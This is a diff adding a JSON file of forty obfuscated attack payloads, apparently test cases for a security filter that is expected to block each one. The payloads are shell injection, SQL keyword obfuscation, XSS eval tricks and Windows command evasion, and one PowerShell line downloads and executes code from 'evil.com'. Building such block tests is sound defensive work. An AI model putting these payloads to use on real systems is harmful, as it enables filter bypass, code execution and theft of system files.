@@ -1,0 +1,362 @@
+[
+  {
+      "id": "OBFUSC-001",
+      "payload": "Y2F0IC9ldGMvcGFzc3dk",
+      "tags": ["base64", "command", "quick"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Base64 encoded 'cat /etc/passwd'",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-002",
+      "payload": ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash",
+      "tags": ["base64", "decode-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Base64 decode and execute",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-003",
+      "payload": "$(echo 'aWQ=' | base64 -d)",
+      "tags": ["base64", "substitution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Base64 in command substitution",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-004",
+      "payload": ";printf '\\x69\\x64'|sh",
+      "tags": ["hex", "printf-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Hex printf pipe to shell",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-005",
+      "payload": ";$'\\x69\\x64'",
+      "tags": ["hex", "ansi-c-quote"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "ANSI-C hex escape execution",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-006",
+      "payload": ";$(echo 6964 | xxd -r -p)",
+      "tags": ["hex", "xxd"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "xxd hex decode execution",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-007",
+      "payload": ";eval $(echo $'\\x69\\x64')",
+      "tags": ["eval", "hex-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Eval with hex escaped string",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-008",
+      "payload": ";python -c 'exec(\"\\x69\\x64\")'",
+      "tags": ["python", "hex-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python exec with hex string",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-009",
+      "payload": ";rev<<<'di'|sh",
+      "tags": ["reverse", "here-string"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "String reverse obfuscation",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-010",
+      "payload": ";$(rev<<<'dwssap/cte/ tac')",
+      "tags": ["reverse", "substitution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Reversed command in substitution",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-011",
+      "payload": ";a]d;b]i[;$a$b",
+      "tags": ["variable", "split"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Variable-based command construction",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-012",
+      "payload": ";X=id;Y=$(echo $X);$Y",
+      "tags": ["variable", "chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Variable chain construction",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-013",
+      "payload": ";echo $PATH|cut -c1",
+      "tags": ["path", "extraction"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "PATH character extraction",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-014",
+      "payload": ";$(tr '[a-z]' '[n-za-m]' <<< 'vq')",
+      "tags": ["rot13", "transform"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "ROT13 command obfuscation",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-015",
+      "payload": "SELECT CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",
+      "tags": ["sqli", "char-concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "SQL CHAR() concatenation",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-016",
+      "payload": "SELECT 0x53454C454354",
+      "tags": ["sqli", "hex-string"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "SQL hex string literal",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-017",
+      "payload": "SELECT UNHEX('53454C454354')",
+      "tags": ["sqli", "unhex"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "SQL UNHEX function",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-018",
+      "payload": "SELECT CONCAT('SEL','ECT')",
+      "tags": ["sqli", "concat-split"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "SQL CONCAT keyword split",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-019",
+      "payload": "SELECT REVERSE('TCELES')",
+      "tags": ["sqli", "reverse"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "SQL REVERSE function",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-020",
+      "payload": "SELECT/*comment*/1",
+      "tags": ["sqli", "comment-insert"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "SQL inline comment insertion",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-021",
+      "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+      "tags": ["xss", "base64-eval"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS base64 atob eval",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-022",
+      "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+      "tags": ["xss", "charcode"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS String.fromCharCode",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-023",
+      "payload": "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
+      "tags": ["xss", "hex-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS hex escape in string",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-024",
+      "payload": "<script>eval('\\141\\154\\145\\162\\164\\50\\61\\51')</script>",
+      "tags": ["xss", "octal-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS octal escape in string",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-025",
+      "payload": "<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')</script>",
+      "tags": ["xss", "unicode-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS Unicode escape in string",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-026",
+      "payload": "<script>[]['constructor']['constructor']('alert(1)')()</script>",
+      "tags": ["xss", "constructor-chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS constructor chain",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-027",
+      "payload": "<script>(0)['constructor']['constructor']('alert(1)')()</script>",
+      "tags": ["xss", "number-prototype"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS via Number prototype",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-028",
+      "payload": "<script>window['al'+'ert'](1)</script>",
+      "tags": ["xss", "string-concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS string concatenation access",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-029",
+      "payload": "<script>self[/al/.source+/ert/.source](1)</script>",
+      "tags": ["xss", "regex-source"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS regex source property",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-030",
+      "payload": "<script>this[('al'+'ert')](1)</script>",
+      "tags": ["xss", "bracket-concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS bracket notation concat",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-031",
+      "payload": "<script>location='javascript:'+('al'+'ert(1)')</script>",
+      "tags": ["xss", "location-concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS location assignment concat",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-032",
+      "payload": "<script>Function('alert(1)')()</script>",
+      "tags": ["xss", "function-constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS Function constructor",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-033",
+      "payload": "<script>new Function`${'alert(1)'}```</script>",
+      "tags": ["xss", "tagged-template"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS tagged template literal",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-034",
+      "payload": "<script>setTimeout`alert(1)`</script>",
+      "tags": ["xss", "settimeout-template"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS setTimeout template literal",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-035",
+      "payload": "<script>import('data:text/javascript,alert(1)')</script>",
+      "tags": ["xss", "dynamic-import"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "XSS dynamic import data URL",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-036",
+      "payload": "powershell -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAA==",
+      "tags": ["powershell", "base64"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell base64 encoded",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-037",
+      "payload": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).downloadstring('http://evil.com/a')",
+      "tags": ["powershell", "download-exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell download and execute",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-038",
+      "payload": "cmd /c \"set a=who&set b=ami&call %a%%b%\"",
+      "tags": ["windows", "variable-concat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows variable concatenation",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-039",
+      "payload": "cmd /c \"for /f %i in ('whoami') do @echo %i\"",
+      "tags": ["windows", "for-loop"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows FOR loop execution",
+      "category": "Obfuscation"
+  },
+  {
+      "id": "OBFUSC-040",
+      "payload": "c^m^d /c whoami",
+      "tags": ["windows", "caret-escape"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows caret escape",
+      "category": "Obfuscation"
+  }
+]
